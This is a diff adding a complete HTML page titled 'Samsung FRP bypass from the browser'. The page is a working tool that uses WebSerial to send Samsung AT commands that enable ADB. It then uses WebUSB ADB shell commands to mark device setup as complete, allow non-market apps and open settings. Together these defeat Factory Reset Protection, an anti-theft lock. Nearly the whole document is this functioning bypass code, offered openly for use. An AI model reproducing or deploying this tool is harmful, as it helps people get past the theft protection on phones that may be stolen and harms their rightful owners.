@@ -1,0 +1,291 @@
+<!--Made by NDXCode-->
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="webadb.js"></script>
+    <title>Samsung FRP bypass from the browser | Made by NDXCode</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 20px auto;
+            padding: 20px;
+        }
+
+        .container {
+            border: 1px solid #ccc;
+            padding: 20px;
+            border-radius: 5px;
+        }
+
+        .log {
+            background: #f5f5f5;
+            padding: 10px;
+            border-radius: 5px;
+            margin: 10px 0;
+            max-height: 200px;
+            overflow-y: auto;
+        }
+
+        .controls {
+            margin: 20px 0;
+        }
+
+        button {
+            padding: 8px 16px;
+            margin-right: 10px;
+        }
+
+        select {
+            padding: 8px;
+            min-width: 200px;
+        }
+
+        .command-list {
+            margin: 20px 0;
+        }
+
+        .command-list button {
+            margin: 5px;
+        }
+
+        center h1 {
+            font-size: 2.4em;
+        }
+    </style>
+</head>
+
+<body>
+    <center><h1>Samsung FRP Bypass</h1></center>
+
+    <div class="container">
+        <h1>WebSerial AT Command Sender</h1>
+
+        <div class="controls">
+            <button id="connectButton">Connect to Serial Port</button>
+            <select id="baudRate">
+                <option value="115200">115200</option>
+                <option value="9600">9600</option>
+                <option value="57600">57600</option>
+            </select>
+        </div>
+
+        <div class="command-list">
+            <h3>Bypass Commands</h3>
+            <button onclick="sendCommand('AT+KSTRINGB=0,3\r\n')">Check Mode</button>
+            <button onclick="sendCommand('AT+DUMPCTRL=1,0\r\n')">DUMPCTRL</button>
+            <button onclick="sendCommand('AT+DEBUGLVC=0,5\r\n')">DEBUGLVC</button>
+            <button onclick="sendCommand('AT+SWATD=0\r\n')">SWATD Off</button>
+            <button onclick="sendCommand('AT+ACTIVATE=0,0,0\r\n')">ACTIVATE</button>
+            <button onclick="sendCommand('AT+SWATD=1\r\n')">SWATD On</button>
+        </div>
+
+        <div>
+            <h3>Custom Command</h3>
+            <input type="text" id="customCommand" placeholder="Enter AT command">
+            <button onclick="sendCustomCommand()">Send</button>
+        </div>
+
+        <div>
+            <h3>Log</h3>
+            <div id="log" class="log"></div>
+        </div>
+    </div>
+
+    <br><br>
+
+    <div class="container">
+        <h1>WebUSB ADB Command Sender</h1>
+
+        <div class="controls">
+            <button id="connectToPhone">Connect</button>
+        </div>
+
+        <div class="command-list">
+            <h3>Bypass Commands</h3>
+            <button onclick="sendCommandAdb('settings put global setup_wizard_has_run 1')">Wizard has run</button>
+            <button onclick="sendCommandAdb('settings put secure user_setup_complete 1')">User setup complete</button>
+            <button onclick="sendCommandAdb('content insert --uri content://settings/secure --bind name:s:DEVICE_PROVISIONED --bind value:i:1')">Device provisioned</button>
+            <button onclick="sendCommandAdb('content insert --uri content://settings/secure --bind name:s:user_setup_complete --bind value:i:1')">USC</button>
+            <button onclick="sendCommandAdb('content insert --uri content://settings/secure --bind name:s:INSTALL_NON_MARKET_APPS --bind value:i:1')">Install nonmarket apps</button>
+            <button onclick="sendCommandAdb('am start -c android.intent.category.HOME -a android.intent.action.MAIN')">Home</button>
+            <button onclick="sendCommandAdb('am start -n com.android.settings/com.android.settings.Settings')">Open settings</button>
+            <button onclick="sendCommandAdb('reboot')">Reboot</button>
+        </div>
+
+        <div>
+            <h3>Custom Command</h3>
+            <input type="text" id="customCommandAdb" placeholder="Enter ADB command">
+            <button onclick="sendCustomCommandAdb()">Send</button>
+        </div>
+
+        <div>
+            <h3>Log</h3>
+            <div id="logadb" class="log"></div>
+        </div>
+    </div>
+
+    <br><br>
+
+    <div class="container">
+        <p>Made by <a target="_blank" href="https://ndxcode.github.io/">NDXCode</a></p>
+    </div>
+
+    <script>
+        let port = null;
+        let reader = null;
+        let writer = null;
+        var readableStreamClosed = null;
+        var writableStreamClosed = null;
+
+        async function connectSerial() {
+            try {
+                port = await navigator.serial.requestPort();
+                await port.open({
+                    baudRate: parseInt(document.getElementById('baudRate').value)
+                });
+
+                const textDecoder = new TextDecoderStream();
+                readableStreamClosed = port.readable.pipeTo(textDecoder.writable);
+                const textEncoder = new TextEncoderStream();
+                writableStreamClosed = textEncoder.readable.pipeTo(port.writable);
+
+                reader = textDecoder.readable.getReader();
+                writer = textEncoder.writable.getWriter();
+
+                log('Connected to serial port');
+                document.getElementById('connectButton').textContent = 'Disconnect';
+                readLoop();
+            } catch (err) {
+                log('Error: ' + err.message);
+            }
+        }
+
+        async function readLoop() {
+            try {
+                while (true) {
+                    const { value, done } = await reader.read();
+                    if (done) {
+                        reader.releaseLock();
+                        break;
+                    }
+                    log('Received: ' + value);
+                }
+            } catch (err) {
+                log('Error in read loop: ' + err.message);
+            }
+        }
+
+        async function sendCommand(command) {
+            if (!writer) {
+                log('Not connected to any serial port');
+                return;
+            }
+
+            try {
+                log('Sending: ' + command);
+                await writer.write(command);
+                await new Promise(resolve => setTimeout(resolve, 500));
+            } catch (err) {
+                log('Error sending command: ' + err.message);
+            }
+        }
+
+        function sendCustomCommand() {
+            const command = document.getElementById('customCommand').value + '\r\n';
+            sendCommand(command);
+        }
+
+        function log(message) {
+            const logDiv = document.getElementById('log');
+            logDiv.innerHTML += message + '<br>';
+            logDiv.scrollTop = logDiv.scrollHeight;
+        }
+
+        document.getElementById('connectButton').addEventListener('click', async () => {
+            if (port) {
+                try {
+                    if (reader) {
+                        await reader.cancel();
+                        await readableStreamClosed.catch(() => { /* Ignore the error */ });
+                    }
+                    if (writer) {
+                        await writer.close();
+                        await writableStreamClosed;
+                    }
+                    await port.close();
+                    port = null;
+                    document.getElementById('connectButton').textContent = 'Connect to Serial Port';
+                    log('Disconnected from serial port');
+                } catch (err) {
+                    log('Error disconnecting: ' + err.message);
+                }
+            } else {
+                connectSerial();
+            }
+        });
+    </script>
+
+
+    <script>
+        function logadb(message) {
+            const logDiv = document.getElementById('logadb');
+            logDiv.innerHTML += message + '<br>';
+            logDiv.scrollTop = logDiv.scrollHeight;
+        }
+
+        let adb;
+
+        async function init() {
+            while (true) {
+                try {
+                    let webusb = await Adb.open("WebUSB");
+                    adb = await webusb.connectAdb("host::");
+                    break;
+                } catch (error) {
+                    if (error.message.includes("host::")) {
+                        alert("Failed to connect for the first time!\nPress OK to try again")
+                        console.log(`Retrying...`);
+                        continue;
+                    }
+                    else {
+                        throw error;
+                    }
+                }
+            }
+        }
+
+        window.addEventListener('unload', async () => {
+            webusb.close();
+        });
+
+        async function sendCommandAdb(command) {
+            try {
+                await adb.shell(command);
+                logadb("OK");
+            } catch (error) {
+                console.error("Command failed:", error);
+            }
+        }
+
+        async function sendCustomCommandAdb() {
+            const adbcommand = document.getElementById('customCommandAdb').value;
+            try {
+                let shell = await adb.shell(adbcommand);
+                logadb("OK");
+            } catch (error) {
+                console.error("Command failed:", error);
+            }
+        }
+
+        let cnt_btn = document.getElementById("connectToPhone");
+        cnt_btn.addEventListener('click', function () {
+            init().catch(console.error);
+        });
+    </script>
+</body>
+
+</html>
